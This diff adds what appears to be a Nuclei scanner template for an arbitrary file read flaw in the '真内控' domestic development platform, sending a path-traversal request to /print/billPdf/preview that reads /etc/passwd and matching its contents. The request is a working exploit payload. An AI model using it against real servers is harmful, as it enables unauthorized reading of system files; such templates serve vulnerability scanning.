@@ -1,0 +1,25 @@
+id: zhenneikong-preview-File-reading
+
+info:
+  name: 真内控国产化开发平台 preview 任意文件读取漏洞
+  author: unknown
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x'
+          - '/bin/bash'
+        condition: and
+      - type: status
+        status: 
+          - 200
